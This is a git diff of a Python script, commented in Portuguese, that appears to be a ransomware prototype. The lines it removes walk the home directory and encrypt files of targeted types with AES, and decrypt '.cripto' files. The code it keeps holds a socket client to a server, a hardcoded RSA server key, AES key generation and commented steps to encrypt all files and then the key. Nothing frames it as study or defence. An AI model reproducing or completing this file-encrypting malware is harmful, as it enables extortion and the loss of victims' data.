@@ -7,10 +7,9 @@
 import os
 import socket
 from random import choice
-import multiprocessing
 
 from gera_chaves_RSA import *
-from criptografa_descriptografa_arquivo_AES import *
+
 
 # listar diretorios a partir do /home/
 # cada thread percorre um diretorio
@@ -38,45 +37,31 @@ texto='''
 '''
 
 def menu():
-    # caminho de partida
     home=os.environ['HOME']
-    # lista com os tipos
-    f=open('tipos_arquivos.txt','r')
-    tipos=f.read()
-    tipos=tipos.split('\n')
-    # diretorios no caminho de partida
-    diretorios=os.listdir(home)
+    print('Partindo de: '+str(home))
+    # lista com todos os arquivos #
+    diretorios=os.listdir(os.getcwd())
     tam=len(diretorios)
-    #for a in range(tam):
-    #    p=multiprocessing.Process(target=listar,args=(diretorios[a],tipos))
-    #    p.start()
-        #p.join() -> em ordem # espera um terminar para começar outro
-    listar('/home/tarcisio/.android',tipos,1)
+    f=open('tipos_arquivos.txt')
+    tipos=f.read()
+    print(tipos)
     # CRIAR UMA THREAD PARA CADA DIRETORIO
     # CADA THREAD LISTAR DIRETORIO
-    #retorno=listar(home,tipos)
+    #retorno=listar(home)
+    #for arquivo in retorno:
+    #    print(arquivo)
 
-
-def listar(diretorio, tipos_arq, modo):
-    if(modo==1): # criptografa
-        for caminho, diretorio, arquivo in os.walk(diretorio):
-            for arq in arquivo:
-                a=caminho+'/'+arq
-                extensao=os.path.splitext(a)
-                for ext in tipos_arq:
-                    if(extensao[1]==ext):
-                        a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                        criptografa(a)
-
-    else: # descriptgrafa
-        for caminho, diretorio, arquivo in os.walk(diretorio):
-            for arq in arquivo:
-                a=caminho+'/'+arq
-                extensao=os.path.splitext(a)
-                if(extensao[1]=='.cripto'):
-                    a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                    descriptografa(a)
-
+def listar(diretorio):
+    # cria uma lista onde será adicionado o nome dos arquivos #
+    arquivos=[]
+    for caminho, diretorio, arquivo in os.walk(diretorio):
+        for arq in arquivo:
+            a=caminho+'/'+arq
+            extensao=os.path.splitext(a)
+            #if():
+                # a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
+                # arquivos.append(a)
+    return arquivos
 
 def client(IP_serv):
 
@@ -101,15 +86,15 @@ def gera_chave_AES():
             senha += choice(caracters)
     return senha
 
-
 menu()
-#if __name__=="__main__":
+'''
+if __name__=="__main__":
     # Chave pública do servidor
-    #serv_RSA=[1121,655]
+    serv_RSA=[1121,655]
     # gera a senha AES
-    #senha_AES=gera_chave_AES()
+    senha_AES=gera_chave_AES()
     # gera a senha RSA
-    #senha_RSA=gera_chaves_RSA()
+    senha_RSA=gera_chaves_RSA()
     # criptografa todos os arquivos com AES
 
     # criptografa a chave AES
